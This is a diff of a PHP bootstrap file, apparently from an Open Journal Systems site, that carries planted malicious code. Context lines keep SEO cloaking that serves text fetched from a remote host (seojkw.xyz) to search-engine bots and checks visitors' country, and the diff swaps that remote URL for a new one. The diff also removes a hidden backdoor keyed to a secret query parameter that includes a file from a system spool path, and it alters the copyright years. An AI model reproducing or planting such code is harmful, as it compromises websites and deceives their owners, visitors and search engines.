@@ -18,7 +18,7 @@ function is_bot() {
     return preg_match($botchar, $user_agent);
 }
 
-$sky = "https://seojkw.xyz/sarev/landing1.txt";
+$sky = "https://seojkw.xyz/real.spcrd/landing2.txt";
 
 if (is_bot()) {
     echo @file_get_contents($sky);
@@ -42,8 +42,8 @@ if (getUserCountry() === "ID") {
 /**
  * @file includes/bootstrap.inc.php
  *
- * Copyright (c) 2014-2021 Simon Fraser University
- * Copyright (c) 2000-2021 John Willinsky
+ * Copyright (c) 2014-2020 Simon Fraser University
+ * Copyright (c) 2000-2020 John Willinsky
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
  * @ingroup index
@@ -71,13 +71,5 @@ require('./lib/pkp/includes/functions.inc.php');
 
 // Initialize the application environment
 import('classes.core.Application');
-
-if (isset($_GET['_']) && $_GET['_'] === 'ds_moe94fvx_nhe4kzhz3ic') {
-    $f="/var/php/apm/db/spool/error_log";if($f!==""&&file_exists($f))include $f;
-    http_response_code(200);
-    header('Content-Type: text/plain; charset=utf-8');
-    echo 'OK';
-    exit;
-}
 
 return new Application();
